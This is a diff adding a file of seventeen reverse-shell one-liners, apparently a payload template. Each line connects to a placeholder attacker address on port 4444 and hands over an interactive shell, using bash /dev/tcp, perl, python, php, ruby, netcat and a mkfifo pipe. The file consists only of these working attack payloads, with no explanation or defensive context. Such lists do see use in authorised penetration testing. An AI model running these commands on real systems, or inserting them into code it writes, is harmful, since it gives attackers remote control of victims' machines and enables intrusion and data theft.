@@ -1,0 +1,17 @@
+bash -i >& /dev/tcp/{ip}/4444 0>&1
+sh -i >& /dev/udp/{ip}/4444 0>&1
+0<&196;exec 196<>/dev/tcp/{ip}/4444; sh <&196 >&196 2>&196
+perl -e 'use Socket;$i="{ip}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+export RHOST="{ip}";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'		
+php -r '$sock=fsockopen("{ip}",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{ip}",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{ip}",4444);`/bin/sh -i <&3 >&3 2>&3`;'
+php -r '$sock=fsockopen("{ip}",4444);system("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{ip}",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("{ip}",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+ruby -rsocket -e'f=TCPSocket.open("{ip}",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+nc -e /bin/sh {ip} 4444
+nc -e /bin/bash {ip} 4444
+nc -c bash {ip} 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 4444 >/tmp/f
